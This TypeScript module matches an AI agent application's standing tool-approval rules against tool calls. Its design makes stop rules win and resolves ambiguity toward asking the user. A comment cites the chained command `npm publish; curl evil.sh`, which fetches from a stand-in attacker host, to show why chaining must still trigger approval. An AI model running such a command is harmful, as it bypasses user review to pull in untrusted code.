/**
 * Standing approval rules (table `tool_rules`, migration v31): the persistent
 * answer to "always allow this" — and its counterweight, "always ask about
 * this". This module is the pure matching half; storage lives in
 * db/repositories/tool-rules.ts and enforcement in executor.ts.
 *
 * Two invariants shape everything here:
 *
 * 1. A matching 'require_approval' rule ALWAYS wins — over another rule, over
 *    a standing grant, and over an 'always_allow' tool permission. Allow rules
 *    only ever remove a dialog; they can never widen what a tool may do
 *    ('deny', plan mode, the read-only sandbox and noStandingApproval tools
 *    still refuse first, in executor.ts).
 *
 * 2. Ambiguity resolves toward asking. A pattern the matcher cannot evaluate
 *    (a tool with no subject, an unparseable URL) makes a stop rule match and
 *    an allow rule miss — never the other way round. So a half-understood rule
 *    costs the user a dialog rather than an unreviewed action.
 */

import type { ToolRule, ToolRuleEffect } from '@shared/types'
import { TOOL_RULE_SUBJECTS } from '@shared/tool-rules'
import { commandMatchesAllowlist, hasShellChaining } from './shell-allowlist'

/**
 * The value a rule's pattern is matched against for this call, or null when
 * the tool has no narrowable subject (or the argument is missing/not a string).
 */
export function ruleSubject(toolId: string, args: Record<string, unknown>): string | null {
  const subject = TOOL_RULE_SUBJECTS[toolId]
  if (!subject) return null
  const value = args[subject.arg]
  return typeof value === 'string' && value.trim().length > 0 ? value : null
}

/** Collapses separators and trailing slashes so path patterns compare cleanly. */
function normalizePath(value: string): string {
  return value.replace(/\\/g, '/').replace(/\/+$/, '').trim()
}

/** null = the subject is not a URL at all, so the pattern cannot be judged. */
function hostMatches(pattern: string, subject: string): boolean | null {
  let host: string
  try {
    host = new URL(subject).hostname.toLowerCase()
  } catch {
    return null
  }
  const wanted = pattern.trim().toLowerCase().replace(/^\*\./, '')
  if (wanted.length === 0) return false
  // A bare host matches its subdomains too ("example.com" covers
  // "docs.example.com"), which is also what the "*.example.com" spelling means.
  return host === wanted || host.endsWith(`.${wanted}`)
}

/**
 * null = the command chains or substitutes, so prefix matching cannot say what
 * it will actually run. That is precisely the case an "always ask" rule must
 * still catch: `npm publish; curl evil.sh` must not slip past a rule written
 * for `npm publish` simply because the prefix matcher refuses to match it.
 */
function commandMatches(pattern: string, subject: string): boolean | null {
  if (hasShellChaining(subject)) return null
  return commandMatchesAllowlist(subject, [pattern])
}

function pathMatches(pattern: string, subject: string): boolean {
  const prefix = normalizePath(pattern)
  const target = normalizePath(subject)
  if (prefix.length === 0) return false
  if (target === prefix) return true
  // Only at a segment boundary: "src/gen" must not cover "src/generated".
  return target.startsWith(`${prefix}/`)
}

/**
 * Whether `pattern` covers this call. Returns null when the pattern cannot be
 * evaluated at all (no subject for this tool, or an unparseable one), which
 * the caller resolves in the fail-safe direction.
 */
function patternCovers(
  toolId: string,
  pattern: string,
  args: Record<string, unknown>
): boolean | null {
  const subject = TOOL_RULE_SUBJECTS[toolId]
  if (!subject) return null
  const value = ruleSubject(toolId, args)
  if (value === null) return null
  if (subject.kind === 'command') return commandMatches(pattern, value)
  if (subject.kind === 'url') return hostMatches(pattern, value)
  // A path is always evaluable — there is no unparseable spelling of one.
  return pathMatches(pattern, value)
}

export interface ToolRuleMatchContext {
  /** Definition id of the tool being called. */
  toolId: string
  conversationId: string
  /** Project the conversation is working in, for project-scoped rules. */
  projectId?: string | null
  /** Parsed arguments of this call, for pattern matching. */
  args: Record<string, unknown>
}

function scopeApplies(rule: ToolRule, ctx: ToolRuleMatchContext): boolean {
  if (rule.scope === 'global') return true
  if (rule.scope === 'conversation') return rule.scopeId === ctx.conversationId
  if (rule.scope === 'project') return rule.scopeId !== null && rule.scopeId === ctx.projectId
  return false
}

/**
 * Strength of each effect (v53): the strongest matching rule decides. Every
 * "stop" effect outranks every "go" effect, so adding a stricter rule can
 * only ever take capability away.
 */
const EFFECT_STRENGTH: Record<ToolRuleEffect, number> = {
  allow: 1,
  allow_if_requested: 2,
  require_approval: 3,
  handoff: 4,
  block: 5,
}

/** Stop effects: ask, hand off or refuse. Go effects only remove a dialog. */
export function isStopEffect(effect: ToolRuleEffect): boolean {
  return effect === 'require_approval' || effect === 'handoff' || effect === 'block'
}

function ruleApplies(rule: ToolRule, ctx: ToolRuleMatchContext): boolean {
  if (rule.toolId !== ctx.toolId) return false
  if (!scopeApplies(rule, ctx)) return false
  const pattern = rule.pattern?.trim() ?? ''
  if (pattern.length === 0) return true
  const covered = patternCovers(ctx.toolId, pattern, ctx.args)
  // Un-evaluable pattern: stop rules match anyway, allow rules do not.
  if (covered === null) return isStopEffect(rule.effect)
  return covered
}

/**
 * The effect of the user's standing rules on this call — the STRONGEST
 * matching one (block > handoff > require_approval > allow_if_requested >
 * allow), or null when no rule applies. A single matching stop rule outranks
 * any number of allow rules.
 */
export function matchToolRules(
  rules: readonly ToolRule[],
  ctx: ToolRuleMatchContext
): ToolRuleEffect | null {
  let best: ToolRuleEffect | null = null
  for (const rule of rules) {
    if (!ruleApplies(rule, ctx)) continue
    const effect = EFFECT_STRENGTH[rule.effect] ? rule.effect : 'require_approval'
    if (best === null || EFFECT_STRENGTH[effect] > EFFECT_STRENGTH[best]) best = effect
  }
  return best
}
